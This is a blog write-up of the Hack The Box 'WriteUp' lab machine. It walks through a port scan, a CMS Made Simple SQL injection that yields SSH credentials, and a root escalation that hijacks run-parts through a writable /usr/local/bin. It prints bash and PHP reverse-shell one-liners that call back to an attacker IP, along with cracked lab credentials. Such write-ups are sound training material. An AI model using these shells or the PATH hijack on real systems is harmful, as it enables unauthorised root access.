---
layout: post
title: WriteUp
categories:
- Hack The Box
---

>Another day, a different dream perhaps.
>
>-Alice

Time to get back to the business of learning something new. Today I looked at the WriteUp box. Rated as easy, this box didn't take too long to break, although I must admit I struggled a little bit with privesc simply because I tunnel visioned instead of moving on.

First as always let's start with a port scan to determine what we should be looking at.

```

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/writeup/
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Nothing here yet.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Looks like we have an open SSH port and a hosted site. Straight away we see that there is a disallowed entry in **robots.txt**. Let's have a look at the site then check out the `/writeup/` directory.

![WriteUp Landing Page]({{"/images/WriteUp-Landing.png" | https://v0lch0k.github.io/images/WriteUp-Landing.png }})

Doesn't look like there is much here. Take note of the warning `Eeyore DoS protection script that is in place and watches for Apache 40x errors and bans bad IPs.`

We can try dirbuster and run the risk of having our IP blacklisted but let's first have a look at the `/WriteUp/` directory.

![WriteUp Landing Page]({{"/images/WriteUp-Wapp.png" | https://v0lch0k.github.io/images/WriteUp-Wapp.png }})

A few interesting write ups for older machines, but nothing that jumps out at us. Interesting that this part of the site uses a different web application. Namely `CMS Made Simple`. Having a quick look through the the exploit database we come across sever exploits relating to CMSMS.

![WriteUp Exploit DB]({{"/images/WriteUp-Search.png" | https://v0lch0k.github.io/images/WriteUp-Search.png }})

Let's try the SQL Injection one. 

```

python 46635.py -u http://10.10.10.138/writeup/



[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
[+] Password cracked: raykayjay9

```

Looks like it's provided us with a username and a password. Attempting to use this at `/writeup/admin/` proves fruitless.

Let's see where else we could use it. Maybe that open ssh port?

Success

![WriteUp Exploit DB]({{"/images/WriteUp-Search.png" | https://v0lch0k.github.io/images/WriteUp-Search.png }})

Looks like we can grab the user flag from the home directory.

```
user.txt
d4e493fd4068afc9eb1aa6a55319f978
```

Now let's see how what we can use for privesc.

`ps aux` shows a few interesting processes but nothing that jumps out at us. Let's run our `LinEnum` scripts and employ the use of `pspy` to watch for any interesting processes or cronjobs.

```
2019/07/22 05:21:01 CMD: UID=0    PID=3937   | /usr/sbin/CRON 
2019/07/22 05:21:01 CMD: UID=0    PID=3938   | /usr/sbin/CRON 
2019/07/22 05:21:01 CMD: UID=0    PID=3939   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
```


Looks like `pspy` picked up a cronjob running out of the root directory. Unfortunately we don't have access to it. Let's keep looking around and check back with `pspy` every once in a while.

Digging around the `LinEnum` output didn't reveal anything that jumps out, other than some `.htpasswd` files.

```

[-] htpasswd found - could contain passwords:
/usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_wrongrelm/.htpasswd
username:wrongrelm:99cd340e1283c6d0ab34734bd47bdc30
4105bbb04
/usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_anon/.htpasswd
username:digest anon:25e4077a9344ceb1a88f2a62c9fb60d8
05bbb04
anonymous:digest anon:faa4e5870970cf935bb9674776e6b26a
/usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/authz_owner/.htpasswd
username:$apr1$1f5oQUl4$21lLXSN7xQOPtNsj5s4Nk/
/usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/basic/file/.htpasswd
username:$apr1$uUMsOjCQ$.BzXClI/B/vZKddgIAJCR.
/usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest_time/.htpasswd
username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04
/usr/lib/python3/dist-packages/fail2ban/tests/files/config/apache-auth/digest/.htpasswd
username:digest private area:fad48d3a7c63f61b5b3567a4105bbb04
```

Before we deep dive into these hashes, we should have a look at our `pspy` output. 

```
2019/07/22 05:45:38 CMD: UID=0    PID=4070   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2019/07/22 05:45:38 CMD: UID=0    PID=4071   | run-parts --lsbsysinit /etc/update-motd.d 
2019/07/22 05:45:38 CMD: UID=0    PID=4072   | /bin/sh /etc/update-motd.d/10-uname 
2019/07/22 05:45:38 CMD: UID=0    PID=4073   | sshd: jkr [priv]  
```

That's very interesting, looks like someone sshed in, and as they did a script ran. Testing this out, every time we log in we see the following set of commands run.

```
 sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
```

Looks like this sets the environment path variable for the user every time they log in. Following that it executes `run-parts` to update the motd, and this is all done under UID 0.

Maybe we can hijack this process....

Firstly let's have a look at the path variable. The script first sets it to `/usr/local/bin`, we should take a look at what permissions we have for that directory since the second part of the login script will look for the `run-parts` binary in that folder before finding it in `/bin`.


Looks like we have don't have read permission for the directory, but we do have write. This appears to be our way to root. We should try a simple bash reverse shell here under the guise of the `run-parts` binary.

`bash -i >& /dev/tcp/10.10.10.10/1234 0>&1`

Writing this to a `run-parts` file in the `/usr/local/bin` directory and setting up a listener on our end we attempt to ssh in and trigger the automated script.

Unfortunately, we didn't get a shell back from this method. Let's take a look at the `pspy` output to see if the script was triggered. According to `pspy` everything went as planned. So why didn't we get our shell?
(Note: I spent too long a time trying to figure out why the bash reverse shell wasn't working instead of trying a different shell).
Let's try a different shell, maybe php?

` php -r '$sock=fsockopen("10.10.10.10",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`

Using the same method of writing a file under the guise of `run-parts` to `/usr/local/bin` we log in an eagerly await our shell.

Success! Let's grab our root flag, and while we're at it have a look at what that cleanup script is doing. My guess is it simply, periodically cleans up the `/usr/local/bin` directory.

![WriteUp Exploit DB]({{"/images/WriteUp-Root.png" | https://v0lch0k.github.io/images/WriteUp-Root.png }})